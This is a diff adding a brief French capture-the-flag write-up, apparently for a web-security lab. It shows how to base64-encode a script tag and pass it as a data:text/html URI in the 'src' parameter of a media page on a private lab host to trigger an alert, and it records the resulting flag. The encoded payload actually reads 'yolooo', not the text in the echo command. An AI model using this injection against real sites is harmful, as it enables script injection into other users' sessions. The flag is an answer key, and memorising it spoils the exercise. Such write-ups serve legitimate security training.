@@ -1,0 +1,9 @@
+Aller sur l'url '/?page=media&src=nsa'
+
+Dans le Terminal, lancer la commande:
+	'echo -n "<script>alert('nimportequoi');</script>" | base64'
+
+Puis dans chrome:
+	http://10.12.1.115/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneW9sb29vJyk7PC9zY3JpcHQ+
+
+	Here is the Flag: 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
